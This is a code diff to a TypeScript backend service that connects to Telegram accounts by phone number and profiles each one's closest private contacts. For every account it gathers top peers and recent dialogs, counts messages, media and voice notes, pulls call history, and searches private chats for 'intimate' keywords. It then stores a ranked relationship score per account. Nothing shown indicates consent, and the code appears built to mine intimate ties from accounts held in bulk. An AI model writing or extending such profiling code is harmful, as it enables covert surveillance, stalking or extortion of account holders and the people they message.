@@ -182,55 +182,186 @@ export class UsersService {
 
     try {
       telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });
+      const me = await telegramClient.getMe();
+      const selfId = me.id?.toString();
 
-      const topChats = await telegramClient.getTopPrivateChats(30, false);
-      if (!topChats?.items?.length) {
-        this.logger.log(`[${mobile}] No private chats found for scoring`);
+      // ─── Phase 1: Hybrid candidate discovery ───
+      // Source A: GetTopPeers — Telegram's server-side interaction ranking (not recency-biased)
+      // Source B: iterDialogs — recent chats (catches new relationships GetTopPeers hasn't ranked yet)
+      // Merge + dedup to get the best of both worlds
+
+      const candidateMap = new Map<string, { id: string; name: string; username: string | null; phone: string | null; source: 'topPeers' | 'dialogs' | 'both' }>();
+
+      // Source A: GetTopPeers (1 API call — most valuable signal)
+      try {
+        const topPeersResult = await telegramClient.client.invoke(
+          new Api.contacts.GetTopPeers({
+            correspondents: true,
+            phoneCalls: true,
+            forwardUsers: true,
+            offset: 0,
+            limit: 50,
+            hash: bigInt(0),
+          }),
+        );
+
+        if (topPeersResult instanceof Api.contacts.TopPeers) {
+          const userMap = new Map<string, Api.User>();
+          for (const u of topPeersResult.users || []) {
+            if (u instanceof Api.User && !u.bot) {
+              userMap.set(u.id.toString(), u);
+            }
+          }
+
+          for (const category of topPeersResult.categories || []) {
+            for (const topPeer of category.peers || []) {
+              const peerId = (topPeer.peer as any)?.userId?.toString();
+              if (!peerId || peerId === selfId) continue;
+              const user = userMap.get(peerId);
+              if (!user) continue;
+              candidateMap.set(peerId, {
+                id: peerId,
+                name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
+                username: user.username || null,
+                phone: user.phone || null,
+                source: 'topPeers',
+              });
+            }
+          }
+          this.logger.log(`[${mobile}] GetTopPeers: ${candidateMap.size} candidates`);
+        }
+      } catch (topPeersError) {
+        this.logger.warn(`[${mobile}] GetTopPeers failed (may be disabled): ${(topPeersError as Error).message}`);
+      }
+
+      // Source B: iterDialogs — recent private chats (catches what GetTopPeers misses)
+      try {
+        let dialogCount = 0;
+        for await (const d of telegramClient.client.iterDialogs({ limit: 100 })) {
+          if (!d.isUser || !(d.entity instanceof Api.User)) continue;
+          const user = d.entity as Api.User;
+          if (user.bot) continue;
+          const id = user.id.toString();
+          if (id === selfId) continue;
+
+          const existing = candidateMap.get(id);
+          if (existing) {
+            existing.source = 'both';
+          } else {
+            candidateMap.set(id, {
+              id,
+              name: [user.firstName, user.lastName].filter(Boolean).join(' ').trim() || 'Unknown',
+              username: user.username || null,
+              phone: user.phone || null,
+              source: 'dialogs',
+            });
+          }
+          dialogCount++;
+          if (dialogCount >= 40) break;
+        }
+        this.logger.log(`[${mobile}] iterDialogs: ${dialogCount} users scanned, total candidates: ${candidateMap.size}`);
+      } catch (dialogError) {
+        this.logger.warn(`[${mobile}] iterDialogs failed: ${(dialogError as Error).message}`);
+      }
+
+      if (candidateMap.size === 0) {
+        this.logger.log(`[${mobile}] No candidates found from either source`);
         return;
       }
 
-      const contactsResult = await telegramClient.getContacts();
+      // ─── Phase 1.5: Contacts for mutual detection ───
       const mutualChatIds = new Set<string>();
-      if (contactsResult && 'users' in contactsResult) {
-        for (const user of (contactsResult as any).users || []) {
-          if (user.mutualContact) {
-            mutualChatIds.add(user.id?.toString());
+      try {
+        const contactsResult = await telegramClient.getContacts();
+        if (contactsResult && 'users' in contactsResult) {
+          for (const user of (contactsResult as any).users || []) {
+            if (user.mutualContact) mutualChatIds.add(user.id?.toString());
           }
         }
-      }
+      } catch { }
 
-      const candidateChats = topChats.items.slice(0, 10);
+      // ─── Phase 2: Per-chat enrichment (top 15 candidates) ───
+      // For each candidate: message count, media count, voice count, call stats,
+      // common chats, intimate keyword search — NO media filter (text-heavy relationships qualify)
+
+      const allCandidates = Array.from(candidateMap.values()).slice(0, 15);
       const candidates: RelationshipCandidate[] = [];
+      const callAgg = { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 };
 
-      for (const chat of candidateChats) {
+      for (const candidate of allCandidates) {
         try {
-          const chatPeer = await telegramClient.getchatId(chat.chatId === 'me' ? 'me' : chat.chatId);
+          const chatPeer = await telegramClient.getchatId(candidate.id);
 
+          // Message count (1 API call)
+          let totalMessages = 0;
+          let lastMessageDate: string | null = null;
+          try {
+            const msgResult = await telegramClient.client.getMessages(candidate.id, { limit: 1 });
+            totalMessages = (msgResult as any)?.total ?? 0;
+            const lastMsg = (msgResult as any)?.[0];
+            if (lastMsg?.date) {
+              lastMessageDate = new Date(lastMsg.date * 1000).toISOString();
+            }
+          } catch { }
+
+          // Skip chats with < 5 messages (noise)
+          if (totalMessages < 5) {
+            await sleep(100);
+            continue;
+          }
+
+          // Media + voice counts via GetSearchCounters (1 API call for all filters)
+          let mediaCount = 0;
           let voiceCount = 0;
           try {
             const counters = await telegramClient.client.invoke(
               new Api.messages.GetSearchCounters({
                 peer: chatPeer,
-                filters: [new Api.InputMessagesFilterVoice()],
+                filters: [
+                  new Api.InputMessagesFilterPhotoVideo(),
+                  new Api.InputMessagesFilterVoice(),
+                ],
               }),
             );
-            voiceCount = (counters as any)?.[0]?.count ?? 0;
+            const counterArr = counters as any as Array<{ count: number }>;
+            mediaCount = counterArr?.[0]?.count ?? 0;
+            voiceCount = counterArr?.[1]?.count ?? 0;
           } catch { }
 
-          let commonChats = 0;
-          if (chat.chatId !== 'me') {
-            try {
-              const common = await telegramClient.client.invoke(
-                new Api.messages.GetCommonChats({
-                  userId: chat.chatId,
-                  maxId: bigInt(0),
-                  limit: 100,
-                }),
-              );
-              commonChats = (common as any)?.chats?.length ?? 0;
-            } catch { }
-          }
+          // Call stats from global call log search for this peer
+          let callStats = { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0, outgoing: 0, audioCalls: 0 };
+          try {
+            const callHistory = await telegramClient.getChatCallHistory(candidate.id, 200, false);
+            callStats = {
+              totalCalls: callHistory.totalCalls,
+              incoming: callHistory.incoming,
+              outgoing: callHistory.outgoing,
+              videoCalls: callHistory.videoCalls,
+              audioCalls: callHistory.audioCalls,
+              totalDuration: callHistory.totalDuration,
+              averageDuration: callHistory.averageDuration,
+            };
+            callAgg.totalCalls += callStats.totalCalls;
+            callAgg.incoming += callStats.incoming;
+            callAgg.outgoing += callStats.outgoing;
+            callAgg.video += callStats.videoCalls;
+            callAgg.audio += callStats.audioCalls;
+          } catch { }
 
+          // Common chats
+          let commonChats = 0;
+          try {
+            const common = await telegramClient.client.invoke(
+              new Api.messages.GetCommonChats({
+                userId: candidate.id,
+                maxId: bigInt(0),
+                limit: 100,
+              }),
+            );
+            commonChats = (common as any)?.chats?.length ?? 0;
+          } catch { }
+
+          // Intimate keyword search — sum of match counts across all keywords
           let intimateMessageCount = 0;
           for (const keyword of INTIMATE_KEYWORDS) {
             try {
@@ -250,19 +381,17 @@ export class UsersService {
                 }),
               );
               intimateMessageCount += (result as any)?.count ?? 0;
-              await sleep(200);
+              await sleep(150);
             } catch { }
           }
 
-          const callStats = chat.calls || { totalCalls: 0, incoming: 0, videoCalls: 0, totalDuration: 0, averageDuration: 0 };
-
           candidates.push({
-            chatId: chat.chatId,
-            name: chat.name,
-            username: chat.username,
-            phone: chat.phone,
-            messages: chat.totalMessages,
-            mediaCount: chat.mediaCount,
+            chatId: candidate.id,
+            name: candidate.name,
+            username: candidate.username,
+            phone: candidate.phone,
+            messages: totalMessages,
+            mediaCount,
             voiceCount,
             intimateMessageCount,
             calls: {
@@ -273,32 +402,21 @@ export class UsersService {
               totalDuration: callStats.totalDuration,
             },
             commonChats,
-            isMutualContact: mutualChatIds.has(chat.chatId),
-            lastMessageDate: chat.lastMessageDate,
+            isMutualContact: mutualChatIds.has(candidate.id),
+            lastMessageDate,
           });
 
-          await sleep(300);
+          this.logger.debug(`[${mobile}] Scored ${candidate.name}: msgs=${totalMessages} media=${mediaCount} voice=${voiceCount} intimate=${intimateMessageCount} calls=${callStats.totalCalls} (${candidate.source})`);
+          await sleep(200);
         } catch (chatError) {
-          this.logger.warn(`[${mobile}] Failed to score chat ${chat.chatId}: ${(chatError as Error).message}`);
+          this.logger.warn(`[${mobile}] Failed to score chat ${candidate.id}: ${(chatError as Error).message}`);
         }
       }
 
+      // ─── Phase 3: Rank, persist ───
       const top = rankRelationships(candidates, 5);
       const accountScore = computeAccountScore(top);
       const bestScore = top.length > 0 ? top[0].score : 0;
-
-      const callAgg = topChats.items.reduce(
-        (acc, item) => {
-          const c = item.calls || { totalCalls: 0, incoming: 0, outgoing: 0, videoCalls: 0, audioCalls: 0 };
-          acc.totalCalls += c.totalCalls;
-          acc.incoming += c.incoming;
-          acc.outgoing += c.outgoing;
-          acc.video += c.videoCalls;
-          acc.audio += c.audioCalls;
-          return acc;
-        },
-        { totalCalls: 0, incoming: 0, outgoing: 0, video: 0, audio: 0 },
-      );
 
       await this.userModel.updateOne(
         { mobile },
@@ -313,7 +431,7 @@ export class UsersService {
         },
       ).exec();
 
-      this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}`);
+      this.logger.log(`[${mobile}] Relationship scoring complete: accountScore=${accountScore}, bestScore=${bestScore}, topCount=${top.length}, candidates=${candidates.length}/${candidateMap.size}`);
     } catch (error) {
       parseError(error, `[${mobile}] computeRelationshipScore failed`);
     } finally {
